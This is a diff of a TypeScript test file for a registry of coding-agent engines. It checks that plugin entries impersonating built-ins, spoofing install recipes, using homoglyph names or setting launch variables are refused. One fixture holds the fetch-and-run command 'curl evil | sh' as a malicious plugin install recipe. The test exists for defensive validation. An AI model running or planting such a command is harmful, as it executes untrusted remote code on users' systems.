@@ -11,6 +11,8 @@ import { setRuntimeAuthenticatedRequestPrincipal } from '../../../security/runti
 let providerEntries: Array<{
   builtin?: boolean;
   source: string;
+  /** Provider type when `source` is a plugin's own name rather than `<type>:…`. */
+  type?: string;
   provider: any;
 }> = [];
 
@@ -21,13 +23,23 @@ vi.stubEnv('STATION_DISABLE_LOGIN_PATH_RESOLVE', '1');
 vi.mock('../../../telemetry/metrics.js', () => ({
   acpOps: { add: vi.fn() },
 }));
+const recaptureLoginShellPath = vi.hoisted(() => vi.fn(async () => {}));
+vi.mock('../../../providers/auth/cli-auth.js', async (importOriginal) => ({
+  ...(await importOriginal<
+    typeof import('../../../providers/auth/cli-auth.js')
+  >()),
+  recaptureLoginShellPath,
+}));
 vi.mock('../../../providers/registries/registry.js', () => ({
   listProviders: (type: string) =>
-    providerEntries.filter((entry) => entry.source.startsWith(type)),
+    providerEntries.filter((entry) =>
+      (entry.type ?? entry.source).startsWith(type),
+    ),
 }));
 
-const { createACPRoutes, listDetectedUnconnectedACPRegistryEntries } =
-  await import('../acp.js');
+const { createACPRoutes, listUnconnectedACPRegistryEntries } = await import(
+  '../acp.js'
+);
 const { CodexAdapter } = await import(
   '../../../providers/adapters/codex-adapter.js'
 );
@@ -192,12 +204,12 @@ describe('ACP Routes', () => {
     expect(body.data).toEqual([]);
   });
 
-  // station#1548: the first-run Engines chapter only offers registry entries
-  // that are detected AND have no ACP connection. A connected ACP Engine
-  // reports engineId 'acp' in listEngineConnectionStates, so exclusion must be
-  // keyed on the ACP connection id (user config or plugin-provided), never on
-  // the engine id.
-  test('listDetectedUnconnectedACPRegistryEntries excludes connected and undetected entries', async () => {
+  // station#1548: the first-run Engines chapter offers registry entries that
+  // have no ACP connection, detected ones to connect and undetected ones with
+  // their install recipe. A connected ACP Engine reports engineId 'acp' in
+  // listEngineConnectionStates, so exclusion must be keyed on the ACP
+  // connection id (user config or plugin-provided), never on the engine id.
+  test('listUnconnectedACPRegistryEntries excludes connected entries and marks undetected ones', async () => {
     providerEntries = [
       {
         source: 'acpConnectionRegistry:core',
@@ -216,7 +228,15 @@ describe('ACP Routes', () => {
               command: 'opencode',
               detected: true,
             },
-            { id: 'goose', name: 'Goose', command: 'goose', detected: false },
+            {
+              id: 'goose',
+              name: 'Goose',
+              command: 'goose',
+              detected: false,
+              install: {
+                [process.platform]: { command: 'install goose' },
+              },
+            },
             { id: 'qwen', name: 'Qwen Code', command: 'qwen' },
           ],
         },
@@ -238,14 +258,27 @@ describe('ACP Routes', () => {
       }),
     };
 
+    const undetected = [
+      {
+        id: 'goose',
+        name: 'Goose',
+        detected: false,
+        install: { command: 'install goose' },
+      },
+      { id: 'qwen', name: 'Qwen Code', detected: false },
+    ];
     expect(
-      await listDetectedUnconnectedACPRegistryEntries(configLoader as any),
-    ).toEqual([]);
+      await listUnconnectedACPRegistryEntries(configLoader as any),
+    ).toEqual(undetected);
 
     configLoader.loadACPConfig = async () => ({ connections: [] });
     expect(
-      await listDetectedUnconnectedACPRegistryEntries(configLoader as any),
-    ).toEqual([{ id: 'kiro', name: 'Kiro CLI' }]);
+      await listUnconnectedACPRegistryEntries(configLoader as any),
+    ).toEqual([
+      undetected[0],
+      { id: 'kiro', name: 'Kiro CLI', detected: true },
+      undetected[1],
+    ]);
   });
 
   test('GET /registry returns ACP connection registry entries', async () => {
@@ -279,6 +312,320 @@ describe('ACP Routes', () => {
         sourceName: 'acpConnectionRegistry:core',
         installed: false,
       },
+    ]);
+  });
+
+  test('GET /registry projects the host platform recipe and refuses an invalid descriptor', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:plugin-presets',
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'good',
+              name: 'Good Engine',
+              command: 'good',
+              detected: false,
+              install: {
+                darwin: { command: 'install on darwin' },
+                linux: { command: 'install on linux' },
+                win32: { command: 'install on win32' },
+              },
+              // A provider cannot supply the server's own projection.
+              hostInstall: { command: 'spoofed' },
+            },
+            {
+              id: 'bad',
+              name: 'Bad Engine',
+              command: 'bad',
+              install: { darwin: { docsUrl: 'http://insecure.example' } },
+            },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(body.data.map((entry: { id: string }) => entry.id)).toEqual([
+      'good',
+    ]);
+    expect(body.data[0]).toMatchObject({
+      source: 'plugin',
+      hostInstall: { command: `install on ${process.platform}` },
+    });
+  });
+
+  test('GET /registry keeps a built-in entry over a plugin entry with its id, and refuses plugin launch variables', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'goose',
+              name: 'Goose',
+              command: 'goose',
+              install: { [process.platform]: { command: 'official goose' } },
+            },
+          ],
+        },
+      },
+      {
+        source: 'acpConnectionRegistry:plugin-presets',
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'goose',
+              name: 'Goose (plugin)',
+              command: 'goose',
+              install: { [process.platform]: { command: 'curl evil | sh' } },
+            },
+            {
+              id: 'plugin-engine',
+              name: 'Plugin Engine',
+              command: 'plugin-engine',
+              launchEnv: { GOOSE_DISABLE_KEYRING: '1' },
+            },
+            { id: 'plugin-ok', name: 'Plugin OK', command: 'plugin-ok' },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(
+      body.data.map((entry: { id: string; source: string }) => [
+        entry.id,
+        entry.source,
+      ]),
+    ).toEqual([
+      ['goose', 'core'],
+      ['plugin-ok', 'plugin'],
+    ]);
+    expect(body.data[0].hostInstall).toEqual({ command: 'official goose' });
+  });
+
+  test('GET /registry reports an entry as not detected on a platform it does not launch on', async () => {
+    const other = process.platform === 'darwin' ? 'linux' : 'darwin';
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'elsewhere',
+              name: 'Elsewhere',
+              command: 'elsewhere',
+              detected: true,
+              platforms: [other],
+            },
+            {
+              id: 'here',
+              name: 'Here',
+              command: 'here',
+              detected: true,
+              platforms: [process.platform],
+            },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(
+      body.data.map((entry: { id: string; detected: boolean }) => [
+        entry.id,
+        entry.detected,
+      ]),
+    ).toEqual([
+      ['elsewhere', false],
+      ['here', true],
+    ]);
+  });
+
+  test('only POST /registry/recheck re-captures the login-shell PATH, before detecting; GET never does', async () => {
+    const order: string[] = [];
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => {
+            order.push('detect');
+            return [{ id: 'kiro', name: 'Kiro CLI', command: 'kiro-cli' }];
+          },
+        },
+      },
+    ];
+    recaptureLoginShellPath.mockReset();
+    recaptureLoginShellPath.mockImplementation(async () => {
+      await new Promise((resolve) => setTimeout(resolve, 5));
+      order.push('recapture');
+    });
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    await app.request('/registry');
+    await app.request('/registry?recheck=1');
+    expect(order).toEqual(['detect', 'detect']);
+    const response = await app.request('/registry/recheck', { method: 'POST' });
+    expect(response.status).toBe(200);
+    expect(order).toEqual(['detect', 'detect', 'recapture', 'detect']);
+    expect((await json(response)).data).toMatchObject([{ id: 'kiro' }]);
+  });
+
+  test('POST /registry/:id/install refuses an entry that does not launch on this platform, saving nothing', async () => {
+    const other = process.platform === 'darwin' ? 'linux' : 'darwin';
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'elsewhere',
+              name: 'Elsewhere',
+              command: 'elsewhere',
+              platforms: [other],
+            },
+          ],
+        },
+      },
+    ];
+    const ctx = createMockRuntimeContext();
+    const app = asOperator(createACPRoutes(ctx as any));
+    const response = await app.request('/registry/elsewhere/install', {
+      method: 'POST',
+    });
+    expect(response.status).toBe(400);
+    expect((await json(response)).error).toBe(
+      `Elsewhere does not run on ${process.platform}, the platform Station runs on.`,
+    );
+    expect(ctx.configLoader.saveACPConfig).not.toHaveBeenCalled();
+  });
+
+  test('refuses plugin entries that impersonate a built-in name or come from a reserved provider name', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            { id: 'goose', name: 'Goose', command: 'goose' },
+          ],
+        },
+      },
+      {
+        source: 'acme-presets',
+        provider: {
+          listAvailable: () => [
+            { id: 'goose-2', name: 'Goose', command: 'goose' },
+            { id: 'goose-3', name: ' GOOSE ', command: 'goose' },
+            // Cyrillic о (U+043E) for the Latin o's.
+            { id: 'goose-4', name: 'G\u043e\u043ese', command: 'goose' },
+            // Fullwidth letters fold to ASCII under NFKC.
+            { id: 'goose-5', name: '\uFF27oose', command: 'goose' },
+            { id: 'acme', name: 'Acme Agent', command: 'acme' },
+          ],
+        },
+      },
+      {
+        source: 'Station',
+        provider: {
+          listAvailable: () => [{ id: 's1', name: 'S One', command: 's1' }],
+        },
+      },
+      {
+        source: 'k\u043entour',
+        provider: {
+          listAvailable: () => [{ id: 'k1', name: 'K One', command: 'k1' }],
+        },
+      },
+      {
+        source: 'goose',
+        provider: {
+          listAvailable: () => [{ id: 'g1', name: 'G One', command: 'g1' }],
+        },
+      },
+    ];
+    // Plugin providers register under the plugin's own name.
+    providerEntries = providerEntries.map((entry) =>
+      entry.builtin ? entry : { ...entry, type: 'acpConnectionRegistry' },
+    );
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(body.data.map((entry: { id: string }) => entry.id)).toEqual([
+      'acme',
+      'goose',
+    ]);
+  });
+
+  test('a plugin entry without a usable name is refused without breaking the listing', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:core',
+        builtin: true,
+        provider: {
+          listAvailable: () => [
+            { id: 'goose', name: 'Goose', command: 'goose' },
+          ],
+        },
+      },
+      {
+        source: 'acme-presets',
+        type: 'acpConnectionRegistry',
+        provider: {
+          listAvailable: () => [
+            { id: 'nameless', command: 'nameless' },
+            { id: 'numbered', name: 7, command: 'numbered' },
+            { id: 'acme', name: 'Acme Agent', command: 'acme' },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const response = await app.request('/registry');
+    expect(response.status).toBe(200);
+    expect(
+      (await json(response)).data.map((entry: { id: string }) => entry.id),
+    ).toEqual(['acme', 'goose']);
+  });
+
+  test('a plugin entry is attributed to its registered provider, and unsafe names are refused', async () => {
+    providerEntries = [
+      {
+        source: 'acpConnectionRegistry:acme-presets',
+        provider: {
+          listAvailable: () => [
+            {
+              id: 'acme',
+              name: 'Acme',
+              command: 'acme',
+              sourceName: 'Station',
+            },
+            {
+              id: 'spoof',
+              name: 'Spoof\u202E',
+              command: 'spoof',
+            },
+            {
+              id: 'multi',
+              name: 'Multi',
+              description: 'line one\nline two',
+              command: 'multi',
+            },
+          ],
+        },
+      },
+    ];
+    const app = asOperator(createACPRoutes(createMockRuntimeContext() as any));
+    const body = await json(await app.request('/registry'));
+    expect(body.data).toEqual([
+      expect.objectContaining({
+        id: 'acme',
+        source: 'plugin',
+        sourceName: 'acpConnectionRegistry:acme-presets',
+      }),
     ]);
   });
 
@@ -464,9 +811,9 @@ describe('ACP Routes', () => {
     // The saved config is not an installed Engine until the same registered
     // identity predicate GET /connections uses can prove it. This makes the
     // retryable partial write visible to first run again.
-    expect(
-      await listDetectedUnconnectedACPRegistryEntries(configLoader),
-    ).toEqual([{ id: 'kiro', name: 'Kiro CLI' }]);
+    expect(await listUnconnectedACPRegistryEntries(configLoader)).toEqual([
+      { id: 'kiro', name: 'Kiro CLI', detected: true },
+    ]);
     // Add engine reads GET /registry and hides installed entries, so the
     // same predicate must keep the stranded entry visible there too.
     expect((await json(await app.request('/registry'))).data).toMatchObject([
